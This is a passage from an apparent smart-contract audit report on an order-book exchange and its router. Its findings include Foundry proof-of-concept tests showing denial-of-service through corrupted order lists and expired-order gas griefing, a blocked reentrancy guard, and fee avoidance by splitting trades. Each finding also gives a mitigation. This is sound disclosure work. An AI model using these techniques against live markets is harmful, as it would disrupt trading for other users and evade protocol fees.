    function creditAccount(address, address, uint256) external {}
    function creditAccountNoEvent(address, address, uint256) external {}
    function debitAccount(address, address, uint256) external {}
}

contract CLOBLinkedListCorruptionTest is Test {
    function test_cancelTailAtSamePriceLeavesPopulatedLimitWithNullHead() external {
        MockAccountManager acct = new MockAccountManager();
        CLOB clob = new CLOB(address(this), address(0xCAFE), address(acct), 100);
        clob.initialize(
            MarketConfig({quoteToken: address(0x11), baseToken: address(0x22), quoteSize: 1 ether, baseSize: 1 ether}),
            MarketSettings({status: true, maxLimitsPerTx: 10, minLimitOrderAmountInBase: 100, tickSize: 1, lotSizeInBase: 1}),
            address(this)
        );

        ICLOB.PostLimitOrderArgs memory ask = ICLOB.PostLimitOrderArgs({
            amountInBase: 100,
            price: 1 ether,
            cancelTimestamp: 0,
            side: Side.SELL,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.POST_ONLY
        });

        clob.postLimitOrder(address(this), ask);
        clob.postLimitOrder(address(this), ask);

        ICLOB.CancelArgs memory cancelArgs = ICLOB.CancelArgs({orderIds: new uint256[](1)});
        cancelArgs.orderIds[0] = 2;
        clob.cancel(address(this), cancelArgs);

        Limit memory limit = clob.getLimit(1 ether, Side.SELL);
        assertEq(limit.numOrders, 1);
        assertEq(uint256(limit.headOrder), 0);
        assertEq(uint256(limit.tailOrder), 0);

        ICLOB.PostFillOrderArgs memory bid = ICLOB.PostFillOrderArgs({
            amount: 100,
            priceLimit: type(uint256).max,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.FILL_OR_KILL
        });
        vm.expectRevert(CLOB.ZeroCostTrade.selector);
        clob.postFillOrder(address(this), bid);
    }
}

## Suggested Mitigation
Persist prevOrderId to storage after determining the previous tail. Move self.orders[order.id] = order after _updateLimitPostOrder computes links, or update self.orders[order.id].prevOrderId = tailOrder.id in the non-empty branch. Add invariant tests requiring numOrders > 0 to imply nonzero head/tail and traversal length equal to numOrders.
```

### M-30 / `EANPmE7_tnXWUY7__k2Xm`
- Finding title: Transient reentrancy guard bricks GTERouter entrypoints on non-mainnet chains
- Report lines: 2865-2941
```md
## [M-30]. Transient reentrancy guard bricks GTERouter entrypoints on non-mainnet chains

## id: EANPmE7_tnXWUY7__k2Xm

## Derived From Pattern/Invariant
UnboundedLoops / DSwbqiSHQtiVn_m-fJSoo reentrancy guard state-machine invariant

## Exploit Type
Dos

## Location
GTERouter.executeRoute / launchpadBuy / launchpadSell

## Finding Status: Valid
### Finding Status Justification:
### Finding Complexity: 2
## Minimim Privilege Required:Permissionless


## Description
GTERouter inherits Solady ReentrancyGuardTransient but does not override _useTransientReentrancyGuardOnlyOnMainnet(). In Solady v0.0.287, the default returns true, so on chainid != 1 the modifier takes the SSTORE fallback path and requires the guard slot to be pre-initialized. A freshly deployed GTERouter has that storage slot at zero, so the first call to any nonReentrant router entrypoint reverts before the function body executes.

Vulnerable snippet:

contract GTERouter is ReentrancyGuardTransient { ... }

function executeRoute(...) external nonReentrant inTime(deadline) returns (...) { ... }
function launchpadSell(...) external nonReentrant returns (...) { ... }
function launchpadBuy(...) external nonReentrant returns (...) { ... }

Solady guard branch:

if (block.chainid == 1) { tload/tstore path } else { if eq(sload(s), address()) revert Reentrancy(); sstore(s, address()) }

Because the router never initializes sstore(s, s) and never overrides the guard to always use transient storage, supported L2/testnet deployments are functionally paused.

## Impact
All guarded router flows are unavailable on any supported deployment chain with chainid other than 1. Users cannot execute routed trades or launchpad buy/sell wrappers through the router, causing a protocol-level availability failure for those deployments.

## Proof of Concept
1. Deploy GTERouter on any chain/fork where block.chainid != 1.
2. Ensure the router reentrancy guard slot is untouched, which is the normal deployment state.
3. Call executeRoute with any arguments, even ones that would otherwise revert later.
4. The nonReentrant modifier reverts immediately with Reentrancy before deadline, hop, or market logic runs.
5. Repeat with launchpadBuy or launchpadSell; both are bricked by the same modifier path.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTERouter} from "contracts/router/GTERouter.sol";

contract GTERouterTransientGuardDoSTest is Test {
    function test_nonMainnetRouterEntrypointsRevertBeforeBody() external {
        vm.chainId(42161);

        GTERouter router = new GTERouter(
            payable(address(0x1001)),
            address(0x1002),
            address(0x1003),
            address(0x1004),
            address(0x1005),
            address(0x1006)
        );

        bytes[] memory hops = new bytes[](0);

        vm.expectRevert();
        router.executeRoute(address(0xBEEF), 1, 0, block.timestamp, hops);
    }
}

## Suggested Mitigation
Override the guard in GTERouter to always use transient storage on chains that support Cancun/TSTORE, or explicitly initialize the fallback storage guard slot during deployment when targeting non-mainnet chains. For example: function _useTransientReentrancyGuardOnlyOnMainnet() internal view override returns (bool) { return false; }
```

### M-31 / `-uTFZlqtkstf85f3lJ1Ox`
- Finding title: Expired best-price order queues create unbounded matching work and can gas-brick market progress
- Report lines: 2942-3020
```md
## [M-31]. Expired best-price order queues create unbounded matching work and can gas-brick market progress

## id: -uTFZlqtkstf85f3lJ1Ox

## Derived From Pattern/Invariant
UnboundedLoops / StateGrowthOrStorageBloat

## Exploit Type
GasGriefBlockLimit

## Location
CLOB._matchIncomingBid, _matchIncomingAsk

## Finding Status: Valid
### Finding Status Justification: The matching loops synchronously remove expired best-price orders with no explicit iteration cap. A price level can contain many orders because only unique price levels and per-transaction placements are bounded. Expired removals do not consume incoming amount, so a crossing order can be forced to process an arbitrarily large expired prefix before any trade. If the transaction runs out of gas, all removals revert. There is no standalone paginated cleanup path in the supplied code. The issue is permissionless and in scope.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Matching must synchronously remove every expired order at the current best price before it can reach executable liquidity or the next price. Vulnerable snippets: `_matchIncomingBid` loops `while (bestAskPrice <= incomingOrder.price && incomingOrder.amount > 0)` and calls `_removeExpiredAsk(ds, bestAskOrder); ... continue;`; `_matchIncomingAsk` does the symmetric expired-bid removal. There is no per-call bound, no pagination, and no standalone cleanup path. Attackers can append many minimum-size orders at the same best price over many transactions, let them expire, and force every crossing taker or limit order to process the whole expired queue in one transaction.

## Impact
Core trading on the affected side can become unavailable once the expired best-price queue exceeds block gas. Because removal is rolled back on out-of-gas and fill orders revert if no real trade remains after cleanup, rational keepers have no cheap bounded progress path. The attacker can recover later by cancelling their own expired orders, so the grief cost is temporary locked capital plus gas.

## Proof of Concept
1. Attacker repeatedly posts minimum-size orders at the best ask or bid with a near-term `cancelTimestamp`.
2. After expiry, that price remains the best price in the tree.
3. A taker crossing the spread must remove every expired order in the queue before any fill can occur.
4. Once the queue is large enough, cleanup plus maker-credit materialization exceeds block gas and reverts.
5. Because the revert rolls back all removals, future takers hit the same expired queue again.

## Proof of Code
// Add this test to the CLOBLinkedListPoC test file above; it reuses the same mocks and _deploy helper.
function test_expiredBestAskCleanupGasGrowsWithQueueLength() public {
    uint256 gas10 = _gasToClearExpiredAsks(10);
    uint256 gas100 = _gasToClearExpiredAsks(100);
    assertGt(gas100, gas10, "expired-order cleanup is unbounded and grows with queue length");
}

function _gasToClearExpiredAsks(uint256 n) internal returns (uint256 gasUsed) {
    CLOB clob = _deploy();
    address maker = address(0xA11CE);
    for (uint256 i; i < n; ++i) {
        vm.prank(maker);
        clob.postLimitOrder(
            maker,
            ICLOB.PostLimitOrderArgs({
                amountInBase: 1,
                price: 1,
                cancelTimestamp: uint32(block.timestamp),
                side: Side.SELL,
                clientOrderId: 0,
                limitOrderType: ICLOB.LimitOrderType.POST_ONLY
            })
        );
    }
    vm.warp(block.timestamp + 1);

    uint256 gasBefore = gasleft();
    vm.prank(address(0xB0B));
    clob.postLimitOrder(
        address(0xB0B),
        ICLOB.PostLimitOrderArgs({
            amountInBase: 1,
            price: 1,
            cancelTimestamp: 0,
            side: Side.BUY,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED
        })
    );
    gasUsed = gasBefore - gasleft();
}

## Suggested Mitigation
Add bounded cleanup. For example, expose a paginated `removeExpiredOrders(side, price, maxOrders)` function, cap the number of expired removals attempted inside matching, and allow matching to skip or advance past expired queues only after bounded state progress. Also cap per-price queue length or charge/order-size scale enough to cover worst-case cleanup gas.
```

### M-33 / `WJeKSESLnz563ldIydVzn`
- Finding title: Canceling the tail order corrupts same-price CLOB limits and blocks matching at the best price
- Report lines: 3072-3163
```md
## [M-33]. Canceling the tail order corrupts same-price CLOB limits and blocks matching at the best price

## id: WJeKSESLnz563ldIydVzn

## Derived From Pattern/Invariant
CheapGriefingOrDosProfit

## Exploit Type
Dos

## Location
CLOB / BookLib.BookLib._updateLimitPostOrder / BookLib._updateLimitRemoveOrder

## Finding Status: Valid
### Finding Status Justification: BookLib._updateBookPostOrder stores self.orders[order.id] = order before _updateLimitPostOrder links prevOrderId. In _updateLimitPostOrder, the memory variable order.prevOrderId is updated after storage write, but the stored new order is not updated. Thus the second order at a limit can have prevOrderId == 0 while being tail. When removed by _updateLimitRemoveOrder with limit.numOrders > 1, prev is null and next is null, so it sets headOrder and tailOrder to zero while decrementing numOrders to one and leaving the price in the tree. Matching then reads ds.orders[limit.headOrder] as a null order and can break/revert as described. No complete safeguard is present; this is scoped, permissionless, and exploitable now.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
BookLib stores the new order before linking its prevOrderId, then updates only the memory copy: `self.orders[order.id] = order; ... Order storage tailOrder = self.orders[limit.tailOrder]; tailOrder.nextOrderId = order.id; order.prevOrderId = tailOrder.id; limit.tailOrder = order.id;`. The second order at a price level is therefore stored with prevOrderId == 0. If that tail order is later canceled, `_updateLimitRemoveOrder` treats it as the head and sets both headOrder and tailOrder to zero while leaving numOrders == 1 and the price still present in the tree. Matching then reads a null order at the best bid/ask, produces baseDelta == 0, breaks out of the matching loop, and fill orders crossing that side revert with ZeroCostTrade. An attacker can create two minimum-size orders at the best price, cancel the second, and leave the first locked to cheaply brick matching at that price until the first order is canceled.

## Impact
A permissionless trader can make the best bid or ask price level unmatchable, causing taker fills crossing that side to revert and degrading market availability. The attacker only needs to lock one remaining minimum-size order at the corrupted price.

## Proof of Concept
1. Attacker posts two limit orders at the same best bid or ask price. 2. Because the second order's prevOrderId is never persisted, it is stored as if it had no previous order. 3. Attacker cancels the second order. 4. The limit remains in the price tree with numOrders == 1, but headOrder and tailOrder are zero. 5. Any incoming order crossing that best price reads order id zero, cannot match, breaks, and reverts with ZeroCostTrade for fill orders.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {Test} from "forge-std/Test.sol";
import {Book, BookLib, Limit, MarketConfig, MarketSettings} from "contracts/clob/types/Book.sol";
import {Order, OrderIdLib, Side} from "contracts/clob/types/Order.sol";

contract SamePriceTailCancelCorruptsLimitTest is Test {
    using BookLib for Book;
    using OrderIdLib for uint256;

    Book internal book;

    function setUp() public {
        book.init(
            MarketConfig({quoteToken: address(0x1), baseToken: address(0x2), quoteSize: 1e18, baseSize: 1e18}),
            MarketSettings({status: true, maxLimitsPerTx: 10, minLimitOrderAmountInBase: 100, tickSize: 1, lotSizeInBase: 1})
        );
    }

    function test_tailCancelLeavesNullHeadAtLivePrice() public {
        Order memory first = Order({
            side: Side.BUY,
            cancelTimestamp: 0,
            id: uint256(1).toOrderId(),
            prevOrderId: uint256(0).toOrderId(),
            nextOrderId: uint256(0).toOrderId(),
            owner: address(0xA11CE),
            price: 100,
            amount: 100
        });
        Order memory second = Order({
            side: Side.BUY,
            cancelTimestamp: 0,
            id: uint256(2).toOrderId(),
            prevOrderId: uint256(0).toOrderId(),
            nextOrderId: uint256(0).toOrderId(),
            owner: address(0xB0B),
            price: 100,
            amount: 100
        });

        book.addOrderToBook(first);
        book.addOrderToBook(second);
        assertEq(book.getLimit(100, Side.BUY).headOrder.unwrap(), 1);
        assertEq(book.getLimit(100, Side.BUY).tailOrder.unwrap(), 2);
        assertEq(book.orders[uint256(2).toOrderId()].prevOrderId.unwrap(), 0);

        book.removeOrderFromBook(book.orders[uint256(2).toOrderId()]);

        Limit memory limit = book.getLimit(100, Side.BUY);
        assertEq(limit.numOrders, 1);
        assertEq(limit.headOrder.unwrap(), 0);
        assertEq(limit.tailOrder.unwrap(), 0);
        assertEq(book.getBestBidPrice(), 100);
        assertEq(book.orders[uint256(1).toOrderId()].owner, address(0xA11CE));
    }
}

## Suggested Mitigation
Persist the new order's prevOrderId before writing it to storage, or update the stored new order after linking: set `order.prevOrderId = tailOrder.id` before `self.orders[order.id] = order`, or assign `self.orders[order.id].prevOrderId = tailOrder.id` after the storage write. Add invariant tests for multi-order same-price add/cancel permutations.
```

### M-35 / `XKtuQBa7uy7q6duOwgi1U`
- Finding title: getNextOrders skips lower bid levels by always walking to the next bigger price
- Report lines: 3262-3296
```md
## [M-35]. getNextOrders skips lower bid levels by always walking to the next bigger price

## id: XKtuQBa7uy7q6duOwgi1U

## Derived From Pattern/Invariant
StandardViolation / price-time priority enumeration invariant

## Exploit Type
StandardViolation

## Location
BookLib.getNextOrders

## Finding Status: Valid
### Finding Status Justification: BookLib.getNextOrders always calls self.getNextBiggestPrice(currentOrder.price, currentOrder.side) when it reaches the end of a price-level linked list. For SELL, the next priority price is higher, but for BUY the next lower bid should be returned. Starting at the best bid, getNextBiggestPrice on the buy tree reaches the edge sentinel and omits lower bids. getOrdersPaginated has side-specific logic, but getNextOrders does not. This is an in-scope view-function correctness bug with no complete safeguard.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
BookLib.getNextOrders is intended to enumerate orders by price-time priority from a starting order. When the current order has no nextOrderId at the same price, it always calls self.getNextBiggestPrice(currentOrder.price, currentOrder.side). For SELL orders, the next priority price is higher, so next-biggest is correct. For BUY orders, the next priority after a bid price is the next smaller bid, not a bigger bid. Starting from the best bid, getNextBiggestPrice returns the edge sentinel and lower live bid levels are omitted. Vulnerable snippet: if (currentOrder.nextOrderId.unwrap() != 0) { currentOrder = self.orders[currentOrder.nextOrderId]; } else { uint256 price = self.getNextBiggestPrice(currentOrder.price, currentOrder.side); if (price == 0) break; Limit storage nextLimit = self.getLimit(price, currentOrder.side); currentOrder = self.orders[nextLimit.headOrder]; }.

## Impact
Any integration or keeper relying on getNextOrders for bid-side pagination, quote construction, or order-book state reconciliation receives an incomplete bid book. This can cause stale or incorrect off-chain views and make lower bid liquidity invisible through this interface, degrading core order-book functionality without stealing funds directly.

## Proof of Concept
1. Maker posts a BUY order at price 100. 2. Maker posts another BUY order at price 90. 3. Caller starts getNextOrders from the 100 bid and requests two orders. 4. The function returns the 100 bid, then asks for getNextBiggestPrice(100, BUY) instead of getNextSmallestPrice(100, BUY). 5. Because 100 is the highest bid, the lower 90 bid is skipped even though it is the next price-time priority order.

## Proof of Code
function testGetNextOrdersSkipsLowerBidLevels() public { address maker = address(0xB0B); deal(address(quoteToken), maker, 1_000 ether); vm.startPrank(maker); quoteToken.approve(address(accountManager), type(uint256).max); accountManager.deposit(maker, address(quoteToken), 1_000 ether); ICLOB.PostLimitOrderArgs memory args = ICLOB.PostLimitOrderArgs({amountInBase: 10 ether, price: 100 ether, cancelTimestamp: 0, side: Side.BUY, clientOrderId: 1, limitOrderType: ICLOB.LimitOrderType.POST_ONLY}); clob.postLimitOrder(maker, args); args.price = 90 ether; args.clientOrderId = 2; clob.postLimitOrder(maker, args); uint256 firstId = uint256(bytes32(abi.encodePacked(maker, uint96(1)))); uint256 secondId = uint256(bytes32(abi.encodePacked(maker, uint96(2)))); Order[] memory orders = clob.getNextOrders(firstId, 2); assertEq(OrderId.unwrap(orders[0].id), firstId); assertEq(OrderId.unwrap(orders[1].id), 0); Order memory lowerBid = clob.getOrder(secondId); assertEq(lowerBid.owner, maker); assertEq(lowerBid.price, 90 ether); vm.stopPrank(); }

## Suggested Mitigation
Branch by side when crossing price levels: for BUY use getNextSmallestPrice(currentOrder.price, Side.BUY); for SELL use getNextBiggestPrice(currentOrder.price, Side.SELL). Add tests covering multi-level BUY and SELL enumeration from head, middle, and tail orders.
```

### L-36 / `VTB6di026hozl6UG7W92S`
- Finding title: Per-fill fee flooring lets traders split orders to avoid maker and taker fees
- Report lines: 3297-3369
```md
## [L-36]. Per-fill fee flooring lets traders split orders to avoid maker and taker fees

## id: VTB6di026hozl6UG7W92S

## Derived From Pattern/Invariant
FeeAccountingDrift

## Exploit Type
RoundingError

## Location
FeeDataLib.getTakerFee/getMakerFee

## Finding Status: Valid
### Finding Status Justification:
### Finding Complexity: 2
## Minimim Privilege Required:Permissionless


## Description
Fees are computed independently per maker/taker credit with floor rounding: return amount.fullMulDiv(feeRate, FEE_SCALING). Because FEE_SCALING is 10,000,000, any individual fill amount below ceil(FEE_SCALING / feeRate) pays zero fee. A trader can split a larger intended trade into many small fills just below the fee threshold and systematically avoid fees that would be charged if the same volume were settled as one fill. The same issue applies to maker fees inside AccountManager.settleIncomingOrder because each MakerCredit is charged separately before totals are accrued.

## Impact
Protocol fee revenue can be under-collected for active markets, especially low-decimal or high-value tokens where the zero-fee threshold represents non-dust value. The attacker keeps the avoided fees while executing the same economic trade in smaller chunks.

## Proof of Concept
1. Assume a fee tier has feeRate = 1000, meaning 1000 / 10,000,000 per fill. 2. A single fill of 999,900 units pays floor(999900 * 1000 / 10000000) = 99 units in fees. 3. The attacker instead executes 100 fills of 9,999 units. 4. Each fill pays floor(9999 * 1000 / 10000000) = 0. 5. The attacker avoids all 99 fee units while trading the same total amount.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {Test} from "forge-std/Test.sol";
import {FeeData, FeeDataLib, PackedFeeRates, PackedFeeRatesLib} from "contracts/clob/types/FeeData.sol";

contract FeeRoundingHarness {
    using FeeDataLib for FeeData;
    FeeData internal feeData;
    PackedFeeRates internal rates;

    constructor(uint16 feeRate) {
        uint16[] memory r = new uint16[](1);
        r[0] = feeRate;
        rates = PackedFeeRatesLib.packFeeRates(r);
    }

    function takerFee(uint256 amount) external view returns (uint256) {
        return feeData.getTakerFee(rates, address(this), amount);
    }
}

contract FeeRoundingSplitPoC is Test {
    function testSplitTradesAvoidFees() public {
        FeeRoundingHarness h = new FeeRoundingHarness(1000);

        uint256 chunk = 9_999;
        uint256 chunks = 100;
        uint256 splitFees;
        for (uint256 i; i < chunks; ++i) {
            splitFees += h.takerFee(chunk);
        }

        uint256 singleFee = h.takerFee(chunk * chunks);
        assertEq(splitFees, 0);
        assertGt(singleFee, splitFees);
    }
}


## Suggested Mitigation
Accumulate fee debt at higher precision per account/token and settle rounded fees only when claimed or when the accumulator crosses one token unit. Alternatively enforce a minimum fee-bearing trade size for fee tiers where per-fill floor rounding would produce zero fees.
```

### M-37 / `9E90WTZyPojpmbspEf0t0`
- Finding title: Expired CLOB orders can make GTERouter CLOB fill routes revert or exceed gas
- Report lines: 3370-3547
```md
## [M-37]. Expired CLOB orders can make GTERouter CLOB fill routes revert or exceed gas

## id: 9E90WTZyPojpmbspEf0t0

## Derived From Pattern/Invariant
UnboundedLoops / CheapGriefingOrDosProfit

## Exploit Type
GasGriefBlockLimit

## Location
GTERouter / CLOB.executeRoute -> CLOB.postFillOrder

## Finding Status: Valid
### Finding Status Justification: The finding matches current code. GTERouter executes CLOB_FILL hops through CLOB.postFillOrder, while CLOB removes expired head orders inside unbounded matching loops. If many expired orders precede live liquidity, gas scales with attacker-created order count. If no live order is filled, _processFillBidOrder or _processFillAskOrder reverts with ZeroCostTrade, rolling back the cleanup. No pagination, cleanup cap, or independent finalization path is shown. This is reachable through public order placement and router execution, without user mistake or privileged-role abuse.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
GTERouter executes CLOB route hops as unconditional FILL_OR_KILL taker orders:

fillArgs.fillOrderType = ICLOB.FillOrderType.FILL_OR_KILL;
ICLOB.PostFillOrderResult memory result = ICLOB(market).postFillOrder(msg.sender, fillArgs);

The CLOB matching path then walks top-of-book orders and removes expired orders inside an unbounded while loop before any successful fill:

while (bestAskPrice <= incomingOrder.price && incomingOrder.amount > 0) {
    Order storage bestAskOrder = ds.orders[limit.headOrder];
    if (bestAskOrder.isExpired()) {
        _removeExpiredAsk(ds, bestAskOrder);
        bestAskPrice = ds.getBestAskPrice();
        continue;
    }
    ...
}

If only expired orders are encountered and no live order is filled, postFillOrder later reverts with ZeroCostTrade, rolling back the expired-order removals. If a live order exists behind many expired orders, every router CLOB_FILL must pay gas to scan and remove all attacker-seeded expired orders first. Because order count per price level can grow over many transactions and there is no bounded cleanup/pagination path used by GTERouter, a permissionless maker can cheaply turn top-of-book expired orders into a repeatable gas griefing and route DoS vector.

## Impact
Router users and direct takers can have CLOB fill routes revert or exceed the block gas limit until someone pays for an expensive cleanup transaction. This degrades market liveness and can block routed trades through affected books without stealing funds.

## Proof of Concept
1. Attacker posts many valid ask limit orders at the best ask with a near-term cancelTimestamp.
2. The orders expire but remain at the head of the price level.
3. A victim executes GTERouter.executeRoute with a CLOB_FILL hop, which calls CLOB.postFillOrder.
4. Matching scans expired orders in a while loop before reaching live liquidity; gas grows with attacker order count.
5. If no live liquidity is reached, postFillOrder reverts with ZeroCostTrade and all expired-order removals are rolled back, so the same expired orders continue blocking future fill routes.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {Test} from "forge-std/Test.sol";
import {BeaconProxy} from "@openzeppelin/proxy/beacon/BeaconProxy.sol";
import {UpgradeableBeacon} from "@openzeppelin/proxy/beacon/UpgradeableBeacon.sol";
import {CLOB, MarketConfig, MarketSettings} from "contracts/clob/CLOB.sol";
import {ICLOB, Side} from "contracts/clob/ICLOB.sol";

contract MockFactory {
    function getMaxLimitExempt(address) external pure returns (bool) {
        return false;
    }
}

contract MockAccountManager {
    function settleIncomingOrder(ICLOB.SettleParams calldata) external pure returns (uint256) {
        return 0;
    }
}

contract ExpiredOrderRouteDoSTest is Test {
    address internal maker = address(0xA11CE);
    address internal taker = address(0xB0B);

    function testExpiredOrdersMakeFillGasScaleWithAttackerOrderCount() public {
        vm.warp(1);
        CLOB one = _newClob();
        CLOB many = _newClob();

        _postExpiredAsks(one, 1);
        _postExpiredAsks(many, 100);
        vm.warp(3);

        _postLiveAsk(one);
        _postLiveAsk(many);

        uint256 gasOne = _buyThroughExpired(one);
        uint256 gasMany = _buyThroughExpired(many);

        assertGt(gasMany, gasOne * 2);
    }

    function testFillCannotClearOnlyExpiredTopOfBook() public {
        vm.warp(1);
        CLOB clob = _newClob();
        _postExpiredAsks(clob, 1);
        vm.warp(3);

        vm.expectRevert();
        vm.prank(taker);
        clob.postFillOrder(taker, _buyArgs());

        assertEq(clob.getNumAsks(), 1);
    }

    function _newClob() internal returns (CLOB clob) {
        MockFactory factory = new MockFactory();
        MockAccountManager accountManager = new MockAccountManager();
        CLOB impl = new CLOB(address(factory), address(0x000000000000000000000000000000000000bEEF), address(accountManager), 1_000_000);
        UpgradeableBeacon beacon = new UpgradeableBeacon(address(impl), address(this));

        MarketConfig memory config = MarketConfig({
            quoteToken: address(0x0000000000000000000000000000000000001001),
            baseToken: address(0x0000000000000000000000000000000000001002),
            quoteSize: 1e18,
            baseSize: 1e18
        });
        MarketSettings memory settings = MarketSettings({
            status: true,
            maxLimitsPerTx: type(uint8).max,
            minLimitOrderAmountInBase: 1,
            tickSize: 1,
            lotSizeInBase: 1
        });
        bytes memory initData = abi.encodeWithSelector(CLOB.initialize.selector, config, settings, address(this));
        clob = CLOB(address(new BeaconProxy(address(beacon), initData)));
    }

    function _postExpiredAsks(CLOB clob, uint256 count) internal {
        for (uint256 i; i < count; ++i) {
            vm.prank(maker);
            clob.postLimitOrder(maker, ICLOB.PostLimitOrderArgs({
                amountInBase: 1 ether,
                price: 1 ether,
                cancelTimestamp: uint32(block.timestamp + 1),
                side: Side.SELL,
                clientOrderId: 0,
                limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED
            }));
        }
    }

    function _postLiveAsk(CLOB clob) internal {
        vm.prank(maker);
        clob.postLimitOrder(maker, ICLOB.PostLimitOrderArgs({
            amountInBase: 1 ether,
            price: 1 ether,
            cancelTimestamp: 0,
            side: Side.SELL,
            clientOrderId: 0,
            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED
        }));
    }

    function _buyThroughExpired(CLOB clob) internal returns (uint256 gasUsed) {
        uint256 startGas = gasleft();
        vm.prank(taker);
        clob.postFillOrder(taker, _buyArgs());
        gasUsed = startGas - gasleft();
    }

    function _buyArgs() internal pure returns (ICLOB.PostFillOrderArgs memory) {
        return ICLOB.PostFillOrderArgs({
            amount: 1 ether,
            priceLimit: 1 ether,
            side: Side.BUY,
            amountIsBase: true,
            fillOrderType: ICLOB.FillOrderType.FILL_OR_KILL
        });
    }
}


## Suggested Mitigation
Add a bounded, permissionless expired-order cleanup function with pagination and use it before matching, or cap the number of expired orders removed per fill and return partial progress without reverting cleanup. For router CLOB_FILL hops, avoid relying on unbounded in-fill cleanup; require books to expose bounded cleanup or make expired-order removal independently finalizable.
```

### M-38 / `hRZ--CyWJFFnL-AMLE9Fb`
- Finding title: Canceling a tail order corrupts CLOB price level pointers and bricks matching at that price
- Report lines: 3548-3682
```md
## [M-38]. Canceling a tail order corrupts CLOB price level pointers and bricks matching at that price

## id: hRZ--CyWJFFnL-AMLE9Fb

## Derived From Pattern/Invariant
CheapGriefingOrDosProfit

## Exploit Type
Dos

## Location
CLOB / BookLib.cancel

## Finding Status: Valid
### Finding Status Justification: The storage write before prevOrderId assignment is present in BookLib. A second same-price order is stored with prevOrderId == 0, while only the previous tail's nextOrderId is persisted. When the owner cancels that tail, removal treats it as a head and zeroes the limit pointers without removing the tree node. A following match reads a zero order and reverts through ZeroCostTrade. This is an in-scope, permissionless CLOB.cancel path with no complete guard.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
BookLib stores a newly posted order before assigning its prevOrderId. In addOrderToBook(), _updateBookPostOrder() executes self.orders[order.id] = order, then _updateLimitPostOrder() later executes order.prevOrderId = tailOrder.id on the memory copy only. As a result, every non-head order is stored with prevOrderId == 0. When the owner of a tail order cancels it through CLOB.cancel(), _updateLimitRemoveOrder() treats that tail as the head and sets both limit.headOrder and limit.tailOrder to zero while leaving limit.numOrders == 1 and the price still present in the red-black tree. Matching then reads ds.orders[limit.headOrder] where headOrder is zero, gets a zero-amount maker order, breaks with no fill, and reverts ZeroCostTrade. A permissionless trader can post behind an existing maker at the same best price, cancel their own order, and make all taker/crossing orders at that best price revert until the original maker notices and cancels their orphaned order.

## Impact
A trader can cheaply make the best bid or ask unusable and block normal matching against otherwise valid resting liquidity. Victim maker funds are not stolen, but their order becomes unreachable for fills and the market side remains functionally DoS'd at that price until the victim cancels.

## Proof of Concept
1. Victim posts an ask at the best ask price. 2. Attacker posts another ask at the same price, becoming the tail order. 3. Because prevOrderId was never persisted for the attacker order, it is stored with prevOrderId == 0. 4. Attacker cancels only their own tail order. 5. The price level remains in the ask tree with numOrders == 1, but headOrder and tailOrder are zero. 6. Any buyer attempting to fill that best ask hits the zero head order and reverts with ZeroCostTrade, while the victim order still exists but is unreachable.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {BeaconProxy} from "@openzeppelin/proxy/beacon/BeaconProxy.sol";
import {UpgradeableBeacon} from "@openzeppelin/proxy/beacon/UpgradeableBeacon.sol";
import {CLOB} from "contracts/clob/CLOB.sol";
import {ICLOB} from "contracts/clob/ICLOB.sol";
import {Side, OrderIdLib} from "contracts/clob/types/Order.sol";
import {MarketConfig, MarketSettings, Limit} from "contracts/clob/types/Book.sol";
import {IAccountManager} from "contracts/account-manager/IAccountManager.sol";
import {IOperator} from "contracts/utils/interfaces/IOperator.sol";
import {FeeTiers} from "contracts/clob/types/FeeData.sol";

contract MockAccountManager is IAccountManager, IOperator {
    function getAccountBalance(address, address) external pure returns (uint256) { return 0; }
    function getEventNonce() external pure returns (uint256) { return 0; }
    function getTotalFees(address) external pure returns (uint256) { return 0; }
    function getUnclaimedFees(address) external pure returns (uint256) { return 0; }
    function getFeeTier(address) external pure returns (FeeTiers) { return FeeTiers.ZERO; }
    function getSpotTakerFeeRateForTier(FeeTiers) external pure returns (uint256) { return 0; }
    function getSpotMakerFeeRateForTier(FeeTiers) external pure returns (uint256) { return 0; }
    function deposit(address, address, uint256) external pure {}
    function withdraw(address, address, uint256) external pure {}
    function depositFromRouter(address, address, uint256) external pure {}
    function withdrawToRouter(address, address, uint256) external pure {}
    function registerMarket(address) external pure {}
    function settleIncomingOrder(ICLOB.SettleParams calldata) external pure returns (uint256) { return 0; }
    function collectFees(address, address) external pure returns (uint256) { return 0; }
    function setSpotAccountFeeTier(address, FeeTiers) external pure {}
    function setSpotAccountFeeTiers(address[] calldata, FeeTiers[] calldata) external pure {}
    function creditAccount(address, address, uint256) external pure {}
    function creditAccountNoEvent(address, address, uint256) external pure {}
    function debitAccount(address, address, uint256) external pure {}
    function getOperatorRoleApprovals(address, address) external pure returns (uint256) { return 0; }
    function approveOperator(address, uint256) external pure {}
    function disapproveOperator(address, uint256) external pure {}
}

contract CLOBTailCancelBricksBookTest is Test {
    using OrderIdLib for *;

    ICLOB clob;
    uint256 constant PRICE = 1e18;
    uint256 constant AMOUNT = 100;
    address victim = address(0xA11CE);
    address attacker = address(0xB0B);
    address buyer = address(0xCAFE);

    function setUp() public {
        MockAccountManager accountManager = new MockAccountManager();
        CLOB impl = new CLOB(address(this), address(0xBEEF), address(accountManager), 1_000);
        UpgradeableBeacon beacon = new UpgradeableBeacon(address(impl), address(this));
        bytes memory initData = abi.encodeWithSelector(
            CLOB.initialize.selector,
            MarketConfig({quoteToken: address(0x1), baseToken: address(0x2), quoteSize: 1e18, baseSize: 1e18}),
